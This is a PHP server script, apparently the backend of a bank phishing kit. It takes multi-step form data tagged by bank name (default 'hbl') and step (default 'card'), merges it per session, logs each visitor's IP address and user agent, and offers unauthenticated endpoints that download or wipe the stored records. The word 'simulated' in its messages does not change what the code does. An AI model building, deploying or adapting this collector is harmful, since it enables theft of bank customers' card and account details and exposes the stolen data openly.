<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Data storage file path (with fallback for Vercel / serverless writable /tmp)
$dataDir = __DIR__ . '/data';
if (!file_exists($dataDir)) {
    @mkdir($dataDir, 0777, true);
}

$dataFile = $dataDir . '/submissions.json';

// In serverless environments (like Vercel), if local directory is read-only, use system temp
if (!file_exists($dataFile) && !@file_put_contents($dataFile, json_encode([], JSON_PRETTY_PRINT))) {
    $dataFile = sys_get_temp_dir() . '/sbp_submissions.json';
    if (!file_exists($dataFile)) {
        @file_put_contents($dataFile, json_encode([], JSON_PRETTY_PRINT));
    }
}

$action = $_GET['action'] ?? '';

// Support JSON body input or POST params
$rawInput = file_get_contents('php://input');
$inputData = json_decode($rawInput, true) ?? $_POST;

if (empty($action) && isset($inputData['action'])) {
    $action = $inputData['action'];
}

// 1. Download submissions.json
if ($action === 'download') {
    header('Content-Type: application/json');
    header('Content-Disposition: attachment; filename="simulated_submissions_' . date('Y-m-d_H-i-s') . '.json"');
    if (file_exists($dataFile)) {
        readfile($dataFile);
    } else {
        echo json_encode([]);
    }
    exit;
}

// 2. Clear submissions
if ($action === 'clear') {
    file_put_contents($dataFile, json_encode([], JSON_PRETTY_PRINT));
    header('Content-Type: application/json');
    echo json_encode(['success' => true, 'message' => 'All simulated submission records cleared successfully.']);
    exit;
}

// 3. Get submissions
if ($action === 'get_submissions' || ($_SERVER['REQUEST_METHOD'] === 'GET' && empty($action))) {
    header('Content-Type: application/json');
    $submissions = file_exists($dataFile) ? (json_decode(file_get_contents($dataFile), true) ?? []) : [];
    echo json_encode([
        'success' => true,
        'count' => count($submissions),
        'submissions' => array_reverse($submissions) // Latest first
    ]);
    exit;
}

// 4. Save step / Save submission
if ($action === 'save_step' || $action === 'submit' || $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    
    $sessionId = $inputData['session_id'] ?? ('sess_' . time() . '_' . rand(1000, 9999));
    $bankSlug  = $inputData['bank_slug'] ?? 'hbl';
    $bankName  = $inputData['bank_name'] ?? strtoupper($bankSlug);
    $step      = $inputData['step'] ?? 'card';
    $formData  = $inputData['data'] ?? [];
    
    $submissions = file_exists($dataFile) ? (json_decode(file_get_contents($dataFile), true) ?? []) : [];
    
    // Check if session exists to update it progressively across steps
    $existingIndex = -1;
    foreach ($submissions as $idx => $item) {
        if (isset($item['session_id']) && $item['session_id'] === $sessionId) {
            $existingIndex = $idx;
            break;
        }
    }
    
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    if ($existingIndex >= 0) {
        // Update existing session
        $record = &$submissions[$existingIndex];
        $record['last_step'] = $step;
        $record['updated_at'] = $timestamp;
        $record['bank_slug'] = $bankSlug;
        $record['bank_name'] = $bankName;
        
        // Merge data fields
        foreach ($formData as $k => $v) {
            $record['data'][$k] = $v;
        }
    } else {
        // Create new record
        $record = [
            'id' => uniqid('sub_'),
            'session_id' => $sessionId,
            'bank_slug' => $bankSlug,
            'bank_name' => $bankName,
            'initial_step' => $step,
            'last_step' => $step,
            'created_at' => $timestamp,
            'updated_at' => $timestamp,
            'ip' => $ip,
            'user_agent' => $userAgent,
            'data' => $formData
        ];
        $submissions[] = $record;
    }
    
    // Save to file
    @file_put_contents($dataFile, json_encode($submissions, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
    
    echo json_encode([
        'success' => true,
        'message' => 'Simulated step saved successfully into JSON file.',
        'session_id' => $sessionId,
        'step' => $step,
        'total_submissions' => count($submissions)
    ]);
    exit;
}

// Default fallback
header('Content-Type: application/json');
echo json_encode(['success' => false, 'error' => 'Invalid action']);
